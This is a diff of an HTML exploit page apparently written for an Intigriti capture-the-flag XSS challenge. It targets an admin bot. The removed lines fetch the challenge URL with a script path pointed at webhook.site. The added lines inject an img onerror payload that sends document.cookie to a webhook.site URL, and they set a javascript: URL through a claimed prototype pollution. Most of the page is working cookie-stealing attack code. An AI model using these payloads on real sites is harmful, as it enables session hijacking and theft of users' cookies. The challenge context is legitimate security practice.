@@ -1,17 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>test</title>
+    <title>Intigriti Challenge Exploit</title>
 </head>
 <body>
-    <h1>Test Page</h1>
-    <p>This page is a test </p>
-
+    <h1>Admin Bot Exploit Page</h1>
+    
+    <div data-component="true" data-config='{"path":"/js/","type":"../purify"}'>x</div>
+    
     <script>
-        fetch('https://challenge-0326.intigriti.io/challenge.html?q=<div%20data-component="true"%20data-config={"path":"//webhook.site/7dbceb0c-65a4-41d5-bde4-23b7b79daf47","type":""}></div>&domain=internal', {
-            method: 'GET',
-            credentials: 'include' // Important: includes cookies
-        });
+        // Since purify.min.js is loaded, we can use it to bypass sanitization
+        // But we need to wait for component to load
+        setTimeout(() => {
+            // After component loads, we can manipulate the DOM
+            const container = document.getElementById('resultsContainer');
+            if (container) {
+                // Inject XSS payload that will trigger on admin's session
+                container.innerHTML += '<img src=x onerror="fetch(\'https://webhook.site/7dbceb0c-65a4-41d5-bde4-23b7b79daf47?cookie=\'+document.cookie)">';
+            }
+        }, 1000);
+        
+        // Alternative: Use the authConfig prototype pollution
+        window.authConfig = {
+            dataset: {
+                next: 'javascript:alert(document.cookie)',
+                append: 'true'
+            }
+        };
     </script>
 </body>
 </html>
